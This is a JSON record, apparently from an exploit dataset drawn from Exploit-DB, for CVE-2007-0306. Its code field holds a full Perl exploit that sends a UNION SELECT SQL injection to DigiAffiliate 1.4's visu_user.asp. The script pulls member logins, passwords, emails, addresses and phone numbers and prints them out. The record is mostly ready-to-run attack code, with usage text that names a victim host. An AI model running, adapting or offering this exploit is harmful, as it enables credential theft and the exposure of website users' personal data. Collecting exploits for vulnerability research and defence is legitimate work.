{
  "id": "3122",
  "title": "DigiAffiliate 1.4 - &#039;id&#039; SQL Injection",
  "cve": "CVE-2007-0306",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#[Script Name: DigiAffiliate <= V1.4 Remote Blind SQL Injection Exploit\r\n#[Coded by   : ajann\r\n#[Author     : ajann\r\n#[Contact    : :(\r\n#[S.Page     : http://www.digiappz.com\r\n#[$$         : .299\r\n#[..         : ajann,Turkey\r\n\r\nuse IO::Socket;\r\nif(@ARGV < 1){\r\nprint \"\r\n[========================================================================\r\n[//   DigiAffiliate <= V1.4 Remote Blind SQL Injection Exploit\r\n[//                   Usage: exploit.pl [target]\r\n[//                   Example: exploit.pl victim.com\r\n[//                   Example: exploit.pl victim.com\r\n[//                           Vuln&Exp : ajann\r\n[========================================================================\r\n\";\r\nexit();\r\n}\r\n#Local variables\r\n$server = $ARGV[0];\r\n$server =~ s/(http:\\/\\/)//eg;\r\n$host = \"http://\".$server;\r\n$port = \"80\";\r\n$file = \"/visu_user.asp?id=\";\r\n\r\nprint \"Script <DIR> : \";\r\n$dir = <STDIN>;\r\nchop ($dir);\r\n\r\nif ($dir =~ /exit/){\r\nprint \"-- Exploit Failed[You Are Exited] \\n\";\r\nexit();\r\n}\r\n\r\nif ($dir =~ /\\//){}\r\nelse {\r\nprint \"-- Exploit Failed[No DIR] \\n\";\r\nexit();\r\n }\r\n\r\n\r\n$target = \"-1%20union%20select%200,login,password,name,email,0,fax,city,0,address1,address2,phone,0,0,0,0,city,0,0%20from%20members\";\r\n$target = $host.$dir.$file.$target;\r\n\r\n#Writing data to socket\r\nprint \"+**********************************************************************+\\n\";\r\nprint \"+ Trying to connect: $server\\n\";\r\n$socket = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$server\", PeerPort => \"$port\") || die \"\\n+ Connection failed...\\n\";\r\nprint $socket \"GET $target HTTP/1.1\\n\";\r\nprint $socket \"Host: $server\\n\";\r\nprint $socket \"Accept: */*\\n\";\r\nprint $socket \"Connection: close\\n\\n\";\r\nprint \"+ Connected!...\\n\";\r\n#Getting\r\nwhile($answer = <$socket>) {\r\nif ($answer =~ /name=\\\"login\\\" size=\\\"30\\\" class=\\\"gray_back\\\" value=\\\"(.*?)\\\">/){\r\nprint \"+ Exploit succeed! Getting admin information.\\n\";\r\nprint \"+ ---------------- +\\n\";\r\nprint \"+ Username: $1\\n\";\r\n}\r\n\r\nif ($answer =~ /name=\\\"password\\\" size=\\\"30\\\" class=\\\"gray_back\\\" value=\\\"(.*?)\\\">/){\r\nprint \"+ Password: $1\\n\";\r\n}\r\n\r\nif ($answer =~ /name=\\\"name\\\" size=\\\"30\\\" class=\\\"gray_back\\\" value=\\\"(.*?)\\\">/){\r\nprint \"+ Name: $1\\n\";\r\n}\r\n\r\nif ($answer =~ /name=\\\"email\\\" size=\\\"30\\\" class=\\\"gray_back\\\" value=\\\"(.*?)\" onBlur/){\r\nprint \"+ Email: $1\\n\";\r\n}\r\n\r\nif ($answer =~ /name=\\\"address1\\\" size=\\\"30\\\" class=\\\"gray_back\\\" value=\\\"(.*?)\\\">/){\r\nprint \"+ Address1: $1\\n\";\r\n}\r\n\r\nif ($answer =~ /name=\\\"address2\\\" size=\\\"30\\\" class=\\\"gray_back\\\" value=\\\"(.*?)\\\">/){\r\nprint \"+ Address1: $1\\n\";\r\n}\r\n\r\nif ($answer =~ /name=\\\"city\\\" size=\\\"30\\\" class=\\\"gray_back\\\" value=\\\"(.*?)\\\">/){\r\nprint \"+ City: $1\\n\";\r\n}\r\n\r\nif ($answer =~ /name=\\\"postcode\\\" size=\\\"30\\\" class=\\\"gray_back\\\" value=\\\"(.*?)\\\">/){\r\nprint \"+ PostCode: $1\\n\";\r\n}\r\n\r\nif ($answer =~ /name=\\\"county\\\" size=\\\"30\\\" class=\\\"gray_back\\\" value=\\\"(.*?)\\\">/){\r\nprint \"+ Country: $1\\n\";\r\n}\r\n\r\nif ($answer =~ /name=\\\"phone\\\" size=\\\"30\\\" class=\\\"gray_back\\\" value=\\\"(.*?)\\\">/){\r\nprint \"+ Phone: $1\\n\";\r\n}\r\n\r\nif ($answer =~ /name=\\\"iurl\\\" size=\\\"24\\\" class=\\\"gray_back\\\" value=\\\"(.*?)\\\">/){\r\nprint \"+ Fax: $1\\n\";\r\n}\r\n\r\n\r\nif ($answer =~ /name=\\\"title\\\" size=\\\"30\\\" class=\\\"gray_back\\\" value=\\\"(.*?)\\\">/){\r\nprint \"+ Country: $1\\n\";\r\n}\r\n\r\nif ($answer =~ /Syntax error/) { \r\nprint \"+ Exploit Failed : ( \\n\";\r\nprint \"+**********************************************************************+\\n\";\r\nexit(); \r\n}\r\n\r\nif ($answer =~ /Internal Server Error/) {\r\nprint \"+ Exploit Failed : (  \\n\";\r\nprint \"+**********************************************************************+\\n\";\r\nexit(); \r\n}\r\n }\r\n\r\n# milw0rm.com [2007-01-13]",
  "url": "https://www.exploit-db.com/exploits/3122"
}